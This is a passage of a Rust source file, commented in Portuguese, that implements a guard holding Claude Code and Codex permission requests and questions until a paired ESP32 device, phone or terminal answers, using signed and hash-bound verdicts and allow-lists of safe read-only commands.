//! Adaptado de VibePulse (https://github.com/niclasvestlund-YT/vibepulse), MIT, (c) 2026 Niclas Vestlund
//!
//! Guarda de interações ("Needs You") para segurar perguntas e permissões do Claude Code e do Codex
//! até a placa ESP32-S3, o celular ou o terminal responderem.

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use ring::digest::{digest, SHA256};
use ring::hmac;
use ring::rand::{SecureRandom, SystemRandom};
use serde::Serialize;
use serde_json::{json, Map, Value};
use tokio::sync::oneshot;

use super::constant_time_str_eq;
use super::tokens_agents::sanitize_project;

pub const MAX_PENDING: usize = 8;
pub const ISSUED_ID_HISTORY_LIMIT: usize = 256;
pub const HOLD_SECS: u64 = 120;
pub const MAX_HOLD_MS: u64 = u32::MAX as u64;
pub const FRESHNESS_SECS: i64 = 90;
pub const ALIVE_POLL_DURATION: Duration = Duration::from_secs(2);
pub const PENDING_BUDGET_BYTES: usize = 640;
pub const RESPONSE_CEILING_BYTES: usize = 3584;

pub const PROMPT_MAX: usize = 96;
pub const TITLE_MAX: usize = 64;
pub const SUBTITLE_MAX: usize = 64;
pub const TOOL_MAX: usize = 24;

const RECOMMENDED_SUFFIX: &str = "(recommended)";
const SAFE_BUILD_TARGETS: [&str; 4] = ["all", "build", "test", "check"];
const SAFE_NPM_FLAGS: [&str; 3] = ["--silent", "--if-present", "--ignore-scripts"];
const SAFE_GIT_STATUS_FLAGS: [&str; 5] = ["--short", "-s", "--branch", "-b", "--porcelain"];
const SAFE_GIT_LOG_SHOW_FLAGS: [&str; 6] = [
    "--oneline",
    "--decorate",
    "--graph",
    "--stat",
    "--patch",
    "--no-color",
];
const SAFE_GIT_DIFF_FLAGS: [&str; 7] = [
    "--stat",
    "--name-only",
    "--name-status",
    "--check",
    "--no-color",
    "--cached",
    "--staged",
];
const APPROVABLE_READ_TOOLS: [&str; 4] = ["read", "glob", "grep", "notebookread"];

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InteractionProvider {
    Claude,
    Codex,
}

impl InteractionProvider {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Claude => "claude",
            Self::Codex => "codex",
        }
    }

    pub fn parse(raw: &str) -> Option<Self> {
        match raw {
            "claude" => Some(Self::Claude),
            "codex" => Some(Self::Codex),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InteractionKind {
    Question,
    Permission,
}

impl InteractionKind {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Question => "question",
            Self::Permission => "permission",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    Approve,
    Deny,
    Terminal,
}

impl Verdict {
    pub fn parse(raw: &str) -> Option<Self> {
        match raw {
            "approve" => Some(Self::Approve),
            "deny" => Some(Self::Deny),
            "terminal" | "leave_it" => Some(Self::Terminal),
            _ => None,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Self::Approve => "approve",
            Self::Deny => "deny",
            Self::Terminal => "terminal",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ResolvedOutcome {
    pub verdict: Verdict,
    pub option_index: Option<usize>,
    pub pipe_request_id: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LegacyPendingApprovalView {
    pub id: String,
    pub agent: String,
    pub tool: String,
    pub command: String,
    pub dangerous: bool,
    pub created_at: u64,
}

#[derive(Debug, Clone)]
struct CodexQuestionOption {
    label: String,
    recommended: bool,
}

#[derive(Debug, Clone)]
enum StoredOrigin {
    ClaudeQuestion {
        questions_raw: Value,
        question_text: String,
        option_labels: Vec<String>,
    },
    ClaudePermission,
    CodexQuestion {
        options: Vec<CodexQuestionOption>,
    },
    CodexPermission,
    PipeOrLegacy {
        agent: String,
        command_raw: String,
    },
}

struct PendingEntry {
    request_id: String,
    provider: InteractionProvider,
    kind: InteractionKind,
    project: String,
    view: BTreeMap<String, Value>,
    view_sha256: String,
    can_approve: bool,
    recommended_index: Option<usize>,
    hold_ms: u64,
    created_at_ms: u64,
    expires_at_ms: u64,
    expires_at_sec: u64,
    arrival_index: u64,
    pipe_request_id: Option<String>,
    origin: StoredOrigin,
    waiter: Option<oneshot::Sender<Option<Verdict>>>,
}

#[derive(Default)]
struct LegacyTurnState {
    your_turn: bool,
    turn_seq: u64,
    agent: Option<String>,
    project: Option<String>,
    decisions: HashMap<String, String>,
    approval_times: HashMap<String, u64>,
}

struct StoreInner {
    pending: HashMap<String, PendingEntry>,
    next_arrival_index: u64,
    issued_ids: HashSet<String>,
    issued_order: VecDeque<String>,
    legacy: LegacyTurnState,
}

impl Default for StoreInner {
    fn default() -> Self {
        Self {
            pending: HashMap::new(),
            next_arrival_index: 0,
            issued_ids: HashSet::new(),
            issued_order: VecDeque::new(),
            legacy: LegacyTurnState::default(),
        }
    }
}

pub struct ParkedHandle {
    pub request_id: String,
    pub provider: InteractionProvider,
    pub kind: InteractionKind,
    pub view_sha256: String,
    pub expires_at_ms: u64,
    pub rx: oneshot::Receiver<Option<Verdict>>,
}

pub struct InteractionStore {
    inner: Mutex<StoreInner>,
    reveal_detail: AtomicBool,
}

impl Default for InteractionStore {
    fn default() -> Self {
        Self::new(true)
    }
}

impl InteractionStore {
    pub fn new(reveal_detail: bool) -> Self {
        Self {
            inner: Mutex::new(StoreInner::default()),
            reveal_detail: AtomicBool::new(reveal_detail),
        }
    }

    pub fn set_reveal_detail(&self, reveal: bool) {
        self.reveal_detail.store(reveal, Ordering::Relaxed);
    }

    pub fn now_ms() -> u64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0)
    }

    pub fn now_sec() -> u64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0)
    }

    fn mint_id_locked(inner: &mut StoreInner) -> Option<String> {
        let protected: HashSet<&str> = inner.pending.keys().map(String::as_str).collect();
        while inner.issued_ids.len() >= ISSUED_ID_HISTORY_LIMIT {
            let mut removed = None;
            let len = inner.issued_order.len();
            for _ in 0..len {
                let candidate = inner.issued_order.pop_front()?;
                if protected.contains(candidate.as_str()) {
                    inner.issued_order.push_back(candidate);
                } else {
                    removed = Some(candidate);
                    break;
                }
            }
            if let Some(id) = removed {
                inner.issued_ids.remove(&id);
            } else {
                return None;
            }
        }

        let rng = SystemRandom::new();
        for _ in 0..32 {
            let mut bytes = [0u8; 16];
            if rng.fill(&mut bytes).is_err() {
                return None;
            }
            let mut id = String::with_capacity(32);
            for b in bytes {
                use std::fmt::Write as _;
                let _ = write!(&mut id, "{b:02x}");
            }
            if !inner.issued_ids.contains(&id) {
                inner.issued_ids.insert(id.clone());
                inner.issued_order.push_back(id.clone());
                return Some(id);
            }
        }
        None
    }

    fn sweep_locked(inner: &mut StoreInner, now_ms: u64) {
        let expired_ids: Vec<String> = inner
            .pending
            .iter()
            .filter(|(_, e)| e.expires_at_ms <= now_ms)
            .map(|(k, _)| k.clone())
            .collect();
        for id in expired_ids {
            if let Some(mut entry) = inner.pending.remove(&id) {
                inner.legacy.approval_times.remove(&id);
                if let Some(tx) = entry.waiter.take() {
                    let _ = tx.send(None);
                }
                crate::log::line(format!(
                    "interaction id={} provider={} kind={} action=timeout",
                    entry.request_id,
                    entry.provider.as_str(),
                    entry.kind.as_str()
                ));
            }
        }
    }

    pub fn park_claude_question(
        &self,
        event: &Value,
        hold_secs: u64,
        now_ms: u64,
    ) -> Option<ParkedHandle> {
        let obj = event.as_object()?;
        let cwd = obj.get("cwd").and_then(Value::as_str);
        if let Some(c) = cwd {
            if !is_safe_text(c) {
                return None;
            }
        }
        let project = sanitize_project(cwd.unwrap_or(""));
        if !is_safe_text(&project) {
            return None;
        }
        let tool_input = obj.get("tool_input")?;
        let q = first_claude_question(tool_input)?;
        if !is_safe_text(q.question) {
            return None;
        }
        if let Some(hdr) = q.header {
            if !is_safe_text(hdr) {
                return None;
            }
        }
        for opt in &q.options {
            if !is_safe_text(opt.label) {
                return None;
            }
            if let Some(desc) = opt.description {
                if !is_safe_text(desc) {
                    return None;
                }
            }
        }

        let reveal = self.reveal_detail.load(Ordering::Relaxed);
        let rec_count = q
            .options
            .iter()
            .filter(|o| has_recommended_suffix(o.label))
            .count();
        let marked = rec_count == 1;
        let rec_idx = if marked {
            q.options
                .iter()
                .position(|o| has_recommended_suffix(o.label))
        } else {
            None
        };
        let display_idx = rec_idx.unwrap_or(0);
        let chosen = &q.options[display_idx];
        let clean_label = strip_recommended(chosen.label);

        let mut view = BTreeMap::new();
        view.insert("kind".into(), Value::String("question".into()));
        view.insert("options_total".into(), json!(q.options.len()));
        view.insert("marked".into(), Value::Bool(marked));

        let mut can_approve = false;
        if reveal {
            let (prompt_clean, prompt_trunc) = clean_text(q.question, PROMPT_MAX)?;
            let (title_clean, title_trunc) = clean_text(&clean_label, TITLE_MAX)?;
            view.insert("prompt".into(), Value::String(prompt_clean));
            view.insert("title".into(), Value::String(title_clean));
            let mut sub_trunc = false;
            if let Some(desc) = chosen.description {
                if let Some((sub_clean, trunc)) = clean_text(desc, SUBTITLE_MAX) {
                    view.insert("subtitle".into(), Value::String(sub_clean));
                    sub_trunc = trunc;
                }
            }
            can_approve = marked && !prompt_trunc && !title_trunc && !sub_trunc;
        }
        view.insert("can_approve".into(), Value::Bool(can_approve));

        let origin = StoredOrigin::ClaudeQuestion {
            questions_raw: tool_input.get("questions")?.clone(),
            question_text: q.question.to_string(),
            option_labels: q.options.iter().map(|o| o.label.to_string()).collect(),
        };

        self.insert_entry(
            InteractionProvider::Claude,
            InteractionKind::Question,
            project,
            view,
            can_approve,
            rec_idx,
            hold_secs,
            now_ms,
            None,
            origin,
        )
    }

    pub fn park_claude_permission(
        &self,
        event: &Value,
        hold_secs: u64,
        now_ms: u64,
    ) -> Option<ParkedHandle> {
        let obj = event.as_object()?;
        let tool_name = obj.get("tool_name").and_then(Value::as_str)?;
        if tool_name.trim().eq_ignore_ascii_case("askuserquestion") {
            return None;
        }
        if !is_safe_text(tool_name) {
            return None;
        }
        let cwd = obj.get("cwd").and_then(Value::as_str);
        if let Some(c) = cwd {
            if !is_safe_text(c) {
                return None;
            }
        }
        let project = sanitize_project(cwd.unwrap_or(""));
        if !is_safe_text(&project) {
            return None;
        }

        let tool_input = obj.get("tool_input");
        let command = tool_input
            .and_then(|ti| ti.get("command").or_else(|| ti.get("file_path")))
            .and_then(Value::as_str);
        if let Some(cmd) = command {
            if !is_safe_text(cmd) {
                return None;
            }
        }
        let description = tool_input
            .and_then(|ti| ti.get("description"))
            .and_then(Value::as_str);
        if let Some(desc) = description {
            if !is_safe_text(desc) {
                return None;
            }
        }

        let reveal = self.reveal_detail.load(Ordering::Relaxed);
        let (tool_clean, tool_trunc) = clean_text(tool_name, TOOL_MAX)?;
        let mut view = BTreeMap::new();
        view.insert("kind".into(), Value::String("permission".into()));
        view.insert("tool".into(), Value::String(tool_clean.clone()));

        let mut can_approve = false;
        if reveal {
            let subject = command.unwrap_or("");
            let (title_clean, title_trunc) = match clean_text(subject, TITLE_MAX) {
                Some((t, trunc)) => (t, trunc),
                None => (tool_clean, tool_trunc),
            };
            view.insert("title".into(), Value::String(title_clean));
            let mut sub_trunc = false;
            if let Some(desc) = description {
                if let Some((sub_clean, trunc)) = clean_text(desc, SUBTITLE_MAX) {
                    view.insert("subtitle".into(), Value::String(sub_clean));
                    sub_trunc = trunc;
                }
            }
            let readable = command.is_some_and(|c| !c.trim().is_empty()) && !title_trunc;
            can_approve = !tool_trunc
                && !sub_trunc
                && can_approve_permission(tool_name, command, readable);
        }
        view.insert("can_approve".into(), Value::Bool(can_approve));

        self.insert_entry(
            InteractionProvider::Claude,
            InteractionKind::Permission,
            project,
            view,
            can_approve,
            None,
            hold_secs,
            now_ms,
            None,
            StoredOrigin::ClaudePermission,
        )
    }

    pub fn park_codex_question(
        &self,
        event: &Value,
        hold_secs: u64,
        now_ms: u64,
    ) -> Result<Option<ParkedHandle>, &'static str> {
        let Some(obj) = event.as_object() else {
            return Err("invalid");
        };
        let allowed_top: HashSet<&str> =
            ["cwd", "session_id", "turn_id", "question", "header", "options"]
                .into_iter()
                .collect();
        if obj.keys().any(|k| !allowed_top.contains(k.as_str())) {
            return Err("invalid");
        }
        let Some(cwd) = obj.get("cwd").and_then(Value::as_str) else {
            return Err("invalid");
        };
        let Some(session_id) = obj.get("session_id").and_then(Value::as_str) else {
            return Err("invalid");
        };
        let Some(turn_id) = obj.get("turn_id").and_then(Value::as_str) else {
            return Err("invalid");
        };
        if !text_is_valid(cwd, None)
            || !text_is_valid(session_id, None)
            || !text_is_valid(turn_id, None)
        {
            return Err("invalid");
        }
        let project = sanitize_project(cwd);
        if !is_safe_text(&project) {
            return Err("invalid");
        }

        let Some(prompt) = obj.get("question").and_then(Value::as_str) else {
            return Err("invalid");
        };
        if !text_is_valid(prompt, Some(PROMPT_MAX)) {
            return Err("invalid");
        }
        if let Some(header_val) = obj.get("header") {
            let Some(hdr) = header_val.as_str() else {
                return Err("invalid");
            };
            if !text_is_valid(hdr, Some(TITLE_MAX)) {
                return Err("invalid");
            }
        }
        let Some(raw_options) = obj.get("options").and_then(Value::as_array) else {
            return Err("invalid");
        };
        if !(2..=3).contains(&raw_options.len()) {
            return Err("invalid");
        }

        let allowed_opt: HashSet<&str> = ["label", "description", "recommended"]
            .into_iter()
            .collect();
        let mut options = Vec::with_capacity(raw_options.len());
        let mut descriptions: Vec<Option<String>> = Vec::with_capacity(raw_options.len());
        let mut rec_idx: Option<usize> = None;

        for (idx, raw_opt) in raw_options.iter().enumerate() {
            let Some(opt_obj) = raw_opt.as_object() else {
                return Err("invalid");
            };
            if opt_obj.keys().any(|k| !allowed_opt.contains(k.as_str())) {
                return Err("invalid");
            }
            let Some(label) = opt_obj.get("label").and_then(Value::as_str) else {
                return Err("invalid");
            };
            if !text_is_valid(label, Some(TITLE_MAX)) {
                return Err("invalid");
            }
            let desc = if let Some(d_val) = opt_obj.get("description") {
                let Some(d) = d_val.as_str() else {
                    return Err("invalid");
                };
                if !text_is_valid(d, Some(SUBTITLE_MAX)) {
                    return Err("invalid");
                }
                Some(d.to_string())
            } else {
                None
            };
            let recommended = if let Some(r_val) = opt_obj.get("recommended") {
                let Some(r) = r_val.as_bool() else {
                    return Err("invalid");
                };
                r
            } else {
                false
            };
            if recommended {
                if rec_idx.is_some() {
                    return Err("invalid");
                }
                rec_idx = Some(idx);
            }
            options.push(CodexQuestionOption {
                label: label.to_string(),
                recommended,
            });
            descriptions.push(desc);
        }

        let reveal = self.reveal_detail.load(Ordering::Relaxed);
        let marked = rec_idx.is_some();
        let can_approve = reveal && marked;
        let mut view = BTreeMap::new();
        view.insert("kind".into(), Value::String("question".into()));
        view.insert("options_total".into(), json!(options.len()));
        view.insert("marked".into(), Value::Bool(reveal && marked));
        view.insert("can_approve".into(), Value::Bool(can_approve));
        if reveal {
            view.insert("prompt".into(), Value::String(prompt.to_string()));
            if let Some(idx) = rec_idx {
                view.insert("title".into(), Value::String(options[idx].label.clone()));
                if let Some(desc) = &descriptions[idx] {
                    view.insert("subtitle".into(), Value::String(desc.clone()));
                }
            }
        }

        let handle = self.insert_entry(
            InteractionProvider::Codex,
            InteractionKind::Question,
            project,
            view,
            can_approve,
            rec_idx,
            hold_secs,
            now_ms,
            None,
            StoredOrigin::CodexQuestion { options },
        );
        Ok(handle)
    }

    pub fn park_codex_permission(
        &self,
        event: &Value,
        hold_secs: u64,
        now_ms: u64,
    ) -> Option<ParkedHandle> {
        let obj = event.as_object()?;
        if obj.get("hook_event_name").and_then(Value::as_str) != Some("PermissionRequest") {
            return None;
        }
        let session_id = obj.get("session_id").and_then(Value::as_str)?;
        let turn_id = obj.get("turn_id").and_then(Value::as_str)?;
        let cwd = obj.get("cwd").and_then(Value::as_str)?;
        let tool_name = obj.get("tool_name").and_then(Value::as_str)?;
        if tool_name.trim().eq_ignore_ascii_case("askuserquestion") {
            return None;
        }
        if !text_is_valid(session_id, None)
            || !text_is_valid(turn_id, None)
            || !text_is_valid(cwd, None)
            || !text_is_valid(tool_name, None)
        {
            return None;
        }
        let tool_input = obj.get("tool_input")?.as_object()?;
        let command = tool_input.get("command").and_then(Value::as_str);
        if let Some(c) = command {
            if !is_safe_text(c) {
                return None;
            }
        }
        let description = tool_input.get("description").and_then(Value::as_str);
        if let Some(d) = description {
            if !is_safe_text(d) {
                return None;
            }
        }

        let project = sanitize_project(cwd);
        if !is_safe_text(&project) {
            return None;
        }

        let reveal = self.reveal_detail.load(Ordering::Relaxed);
        let (tool_clean, tool_trunc) = clean_text(tool_name, TOOL_MAX)?;
        let mut view = BTreeMap::new();
        view.insert("kind".into(), Value::String("permission".into()));
        view.insert("tool".into(), Value::String(tool_clean.clone()));

        let mut can_approve = false;
        if reveal {
            let subject = command.unwrap_or("");
            let (title_clean, title_trunc) = match clean_text(subject, TITLE_MAX) {
                Some((t, trunc)) => (t, trunc),
                None => (tool_clean, tool_trunc),
            };
            view.insert("title".into(), Value::String(title_clean));
            let mut sub_trunc = false;
            if let Some(desc) = description {
                if let Some((sub_clean, trunc)) = clean_text(desc, SUBTITLE_MAX) {
                    view.insert("subtitle".into(), Value::String(sub_clean));
                    sub_trunc = trunc;
                }
            }
            let readable = command.is_some_and(|c| !c.trim().is_empty()) && !title_trunc;
            let safe_cmd = if is_shell_tool(tool_name) {
                command.is_some_and(codex_shell_command_is_safe)
            } else {
                can_approve_permission(tool_name, command, readable)
            };
            can_approve = !tool_trunc && !sub_trunc && readable && safe_cmd;
        }
        view.insert("can_approve".into(), Value::Bool(can_approve));

        self.insert_entry(
            InteractionProvider::Codex,
            InteractionKind::Permission,
            project,
            view,
            can_approve,
            None,
            hold_secs,
            now_ms,
            None,
            StoredOrigin::CodexPermission,
        )
    }

    pub fn park_pipe_or_legacy(
        &self,
        pipe_request_id: Option<String>,
        agent: &str,
        cwd_or_project: &str,
        tool: &str,
        command: &str,
        hold_secs: u64,
        now_ms: u64,
    ) -> Option<String> {
        let provider = if agent.trim().to_ascii_lowercase().contains("codex") {
            InteractionProvider::Codex
        } else {
            InteractionProvider::Claude
        };
        let project = sanitize_project(cwd_or_project);
        let (tool_clean, tool_trunc) =
            clean_text(tool, TOOL_MAX).unwrap_or_else(|| ("Tool".into(), false));
        let (title_clean, title_trunc) =
            clean_text(command, TITLE_MAX).unwrap_or_else(|| (tool_clean.clone(), tool_trunc));
        let can_approve = !tool_trunc
            && !title_trunc
            && is_safe_text(command)
            && can_approve_permission(tool, Some(command), !command.trim().is_empty());

        let mut view = BTreeMap::new();
        view.insert("kind".into(), Value::String("permission".into()));
        view.insert("tool".into(), Value::String(tool_clean));
        view.insert("title".into(), Value::String(title_clean));
        view.insert("can_approve".into(), Value::Bool(can_approve));

        let handle = self.insert_entry(
            provider,
            InteractionKind::Permission,
            project.clone(),
            view,
            can_approve,
            None,
            hold_secs,
            now_ms,
            pipe_request_id,
            StoredOrigin::PipeOrLegacy {
                agent: agent.to_string(),
                command_raw: command.to_string(),
            },
        )?;
        {
            let mut inner = self.inner.lock().unwrap();
            inner.legacy.agent = Some(agent.to_string());
            inner.legacy.project = Some(project);
        }
        // Para pedidos vindos do pipe.rs ou /api/agents/event sem waiter HTTP ativo,
        // descartar o rx não cancela o entry; ele permanece até decisão ou TTL.
        std::mem::forget(handle.rx);
        Some(handle.request_id)
    }

    #[allow(clippy::too_many_arguments)]
    fn insert_entry(
        &self,
        provider: InteractionProvider,
        kind: InteractionKind,
        project: String,
        view: BTreeMap<String, Value>,
        can_approve: bool,
        recommended_index: Option<usize>,
        hold_secs: u64,
        now_ms: u64,
        pipe_request_id: Option<String>,
        origin: StoredOrigin,
    ) -> Option<ParkedHandle> {
        if hold_secs == 0 {
            return None;
        }
        let hold_ms = hold_secs.saturating_mul(1000);
        if hold_ms > MAX_HOLD_MS {
            return None;
        }
        let expires_at_ms = now_ms.saturating_add(hold_ms);
        let expires_at_sec = (expires_at_ms + 999) / 1000;

        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        if inner.pending.len() >= MAX_PENDING {
            return None;
        }
        let request_id = Self::mint_id_locked(&mut inner)?;

        let mut stable = BTreeMap::new();
        stable.insert("provider".into(), Value::String(provider.as_str().into()));
        stable.insert("request_id".into(), Value::String(request_id.clone()));
        stable.insert("project".into(), Value::String(project.clone()));
        stable.insert("hold_ms".into(), json!(hold_ms));
        stable.insert("expires_at".into(), json!(expires_at_sec));
        for (k, v) in &view {
            stable.insert(k.clone(), v.clone());
        }
        let stable_bytes = canonical_view_bytes_from_map(&stable);
        if stable_bytes.is_empty() || stable_bytes.len() > PENDING_BUDGET_BYTES {
            return None;
        }
        let view_sha256 = sha256_hex_bytes(&stable_bytes);

        let arrival_index = inner.next_arrival_index;
        inner.next_arrival_index = inner.next_arrival_index.saturating_add(1);
        let (tx, rx) = oneshot::channel();

        let entry = PendingEntry {
            request_id: request_id.clone(),
            provider,
            kind,
            project,
            view,
            view_sha256: view_sha256.clone(),
            can_approve,
            recommended_index,
            hold_ms,
            created_at_ms: now_ms,
            expires_at_ms,
            expires_at_sec,
            arrival_index,
            pipe_request_id,
            origin,
            waiter: Some(tx),
        };
        inner.legacy.approval_times.insert(request_id.clone(), now_ms / 1000);
        inner.pending.insert(request_id.clone(), entry);

        crate::log::line(format!(
            "interaction id={} provider={} kind={} action=parked",
            request_id,
            provider.as_str(),
            kind.as_str()
        ));

        Some(ParkedHandle {
            request_id,
            provider,
            kind,
            view_sha256,
            expires_at_ms,
            rx,
        })
    }

    pub fn abandon(&self, request_id: &str, now_ms: u64) {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        if let Some(mut entry) = inner.pending.remove(request_id) {
            inner.legacy.approval_times.remove(request_id);
            if let Some(tx) = entry.waiter.take() {
                let _ = tx.send(None);
            }
            crate::log::line(format!(
                "interaction id={} provider={} kind={} action=abandoned",
                entry.request_id,
                entry.provider.as_str(),
                entry.kind.as_str()
            ));
        }
    }

    pub fn clear_by_pipe_id(&self, pipe_request_id: &str, now_ms: u64) {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        let matching: Vec<String> = inner
            .pending
            .iter()
            .filter(|(_, e)| e.pipe_request_id.as_deref() == Some(pipe_request_id))
            .map(|(k, _)| k.clone())
            .collect();
        for id in matching {
            if let Some(mut entry) = inner.pending.remove(&id) {
                inner.legacy.approval_times.remove(&id);
                if let Some(tx) = entry.waiter.take() {
                    let _ = tx.send(None);
                }
            }
        }
    }

    pub fn resolve_http(
        &self,
        secret: &str,
        request_id: &str,
        provider_raw: &str,
        view_sha256: &str,
        verdict_raw: &str,
        ts: i64,
        mac: &str,
        now_ms: u64,
        now_sec: u64,
    ) -> Result<(ResolvedOutcome, bool), (u16, &'static str)> {
        let Some(verdict) = Verdict::parse(verdict_raw) else {
            return Err((409, "bad request"));
        };
        if secret.trim().is_empty() {
            return Err((409, "device answers are not configured"));
        }
        let Some(provider) = InteractionProvider::parse(provider_raw) else {
            return Err((409, "signature rejected"));
        };
        if !verify_answer_v2(
            secret,
            provider.as_str(),
            request_id,
            view_sha256,
            verdict_raw,
            ts,
            mac,
            now_sec,
        ) {
            return Err((409, "signature rejected"));
        }
        self.apply_verified_resolution(Some(provider), request_id, view_sha256, verdict, now_ms)
    }

    pub fn resolve_mqtt(
        &self,
        request_id: &str,
        view_sha256: &str,
        verdict_raw: &str,
        ts: i64,
        now_ms: u64,
        now_sec: u64,
    ) -> Result<(ResolvedOutcome, bool), (u16, &'static str)> {
        let Some(verdict) = Verdict::parse(verdict_raw) else {
            return Err((409, "bad request"));
        };
        if !is_fresh_timestamp(ts, now_sec) {
            return Err((409, "stale timestamp"));
        }
        if !is_sha256_hex(view_sha256) {
            return Err((409, "invalid view_sha256"));
        }
        self.apply_verified_resolution(None, request_id, view_sha256, verdict, now_ms)
    }

    fn apply_verified_resolution(
        &self,
        expected_provider: Option<InteractionProvider>,
        request_id: &str,
        view_sha256: &str,
        verdict: Verdict,
        now_ms: u64,
    ) -> Result<(ResolvedOutcome, bool), (u16, &'static str)> {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        let Some(entry) = inner.pending.get(request_id) else {
            return Err((409, "no such pending interaction"));
        };
        if let Some(prov) = expected_provider {
            if entry.provider != prov {
                return Err((409, "interaction binding rejected"));
            }
        }
        if !constant_time_str_eq(view_sha256, &entry.view_sha256) {
            return Err((409, "interaction binding rejected"));
        }
        if verdict == Verdict::Approve && !entry.can_approve {
            return Err((409, "this one has to be approved at the terminal"));
        }

        let mut removed = inner.pending.remove(request_id).unwrap();
        let legacy_word = match verdict {
            Verdict::Approve => "allow",
            Verdict::Deny => "deny",
            Verdict::Terminal => "terminal",
        };
        inner
            .legacy
            .decisions
            .insert(request_id.to_string(), legacy_word.to_string());
        inner.legacy.approval_times.remove(request_id);

        let option_index = if verdict == Verdict::Approve {
            removed.recommended_index
        } else {
            None
        };
        let pipe_request_id = removed.pipe_request_id.take();
        let had_waiter = removed.waiter.is_some();
        if let Some(tx) = removed.waiter.take() {
            let _ = tx.send(Some(verdict));
        }

        crate::log::line(format!(
            "interaction id={} provider={} kind={} verdict={}",
            removed.request_id,
            removed.provider.as_str(),
            removed.kind.as_str(),
            verdict.as_str()
        ));

        Ok((
            ResolvedOutcome {
                verdict,
                option_index,
                pipe_request_id,
            },
            had_waiter,
        ))
    }

    pub fn panic_http(
        &self,
        secret: &str,
        ts: i64,
        mac: &str,
        now_ms: u64,
        now_sec: u64,
    ) -> Result<(usize, Vec<String>), &'static str> {
        if secret.trim().is_empty() || !verify_panic(secret, ts, mac, now_sec) {
            return Err("signature rejected");
        }
        Ok(self.deny_all(now_ms))
    }

    pub fn deny_all(&self, now_ms: u64) -> (usize, Vec<String>) {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        let keys: Vec<String> = inner.pending.keys().cloned().collect();
        let mut pipe_ids = Vec::new();
        let mut count = 0usize;
        for id in keys {
            if let Some(mut entry) = inner.pending.remove(&id) {
                count += 1;
                inner
                    .legacy
                    .decisions
                    .insert(id.clone(), "deny".to_string());
                inner.legacy.approval_times.remove(&id);
                if let Some(pid) = entry.pipe_request_id.take() {
                    pipe_ids.push(pid);
                }
                if let Some(tx) = entry.waiter.take() {
                    let _ = tx.send(Some(Verdict::Deny));
                }
                crate::log::line(format!(
                    "interaction id={} provider={} kind={} action=panic-denied",
                    entry.request_id,
                    entry.provider.as_str(),
                    entry.kind.as_str()
                ));
            }
        }
        (count, pipe_ids)
    }

    pub fn pending_public(&self, now_ms: u64) -> Option<Value> {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        let entry = inner
            .pending
            .values()
            .min_by_key(|e| (e.created_at_ms, e.arrival_index))?;

        let mut map = BTreeMap::new();
        map.insert(
            "request_id".into(),
            Value::String(entry.request_id.clone()),
        );
        map.insert(
            "provider".into(),
            Value::String(entry.provider.as_str().into()),
        );
        map.insert("project".into(), Value::String(entry.project.clone()));
        map.insert("expires_at".into(), json!(entry.expires_at_sec));
        map.insert(
            "expires_in_ms".into(),
            json!(entry.expires_at_ms.saturating_sub(now_ms)),
        );
        map.insert("hold_ms".into(), json!(entry.hold_ms));
        map.insert(
            "view_sha256".into(),
            Value::String(entry.view_sha256.clone()),
        );
        for (k, v) in &entry.view {
            map.insert(k.clone(), v.clone());
        }

        let val = Value::Object(map.into_iter().collect::<Map<String, Value>>());
        let encoded_len = serde_json::to_vec(&val).map(|b| b.len()).unwrap_or(usize::MAX);
        if encoded_len > PENDING_BUDGET_BYTES {
            return None;
        }
        Some(val)
    }

    pub fn attach_pending_to_agent_status(&self, snapshot: &mut Value, now_ms: u64) {
        let Some(pending) = self.pending_public(now_ms) else {
            return;
        };
        let Some(obj) = snapshot.as_object_mut() else {
            return;
        };
        obj.insert("pending".into(), pending);
        let fits = serde_json::to_vec(obj)
            .map(|b| b.len() <= RESPONSE_CEILING_BYTES)
            .unwrap_or(false);
        if !fits {
            obj.remove("pending");
            crate::log::line(
                "interaction pending omitted from /api/agent-status: exceeds 3584-byte ceiling",
            );
        }
    }

    pub fn pending_count(&self, now_ms: u64) -> usize {
        let mut inner = self.inner.lock().unwrap();
        Self::sweep_locked(&mut inner, now_ms);
        inner.pending.len()
    }

    // -------------------------------------------------------------------------
    // Compatibilidade com /api/agents e pipe.rs (substituindo Esp32AgentPanelState)
    // -------------------------------------------------------------------------

    pub fn note_turn(&self, agent: &str, cwd_or_project: &str) {
        let mut inner = self.inner.lock().unwrap();
        inner.legacy.turn_seq += 1;
        inner.legacy.your_turn = true;
        inner.legacy.agent = Some(agent.to_string());
        inner.legacy.project = Some(sanitize_project(cwd_or_project));
    }

    pub fn note_clear(&self, now_ms: u64) {
        let mut inner = self.inner.lock().unwrap();
        inner.legacy.your_turn = false;
        let pipe_ids: Vec<String> = inner
            .pending
            .iter()
            .filter(|(_, e)| matches!(e.origin, StoredOrigin::PipeOrLegacy { .. }))
            .map(|(k, _)| k.clone())
            .collect();
        for id in pipe_ids {
            if let Some(mut entry) = inner.pending.remove(&id) {
                inner.legacy.approval_times.remove(&id);
                if let Some(tx) = entry.waiter.take() {
                    let _ = tx.send(None);
                }
            }
        }
        Self::sweep_locked(&mut inner, now_ms);
    }

    pub fn dismiss_turn(&self) -> Value {
        let mut inner = self.inner.lock().unwrap();
        inner.legacy.your_turn = false;
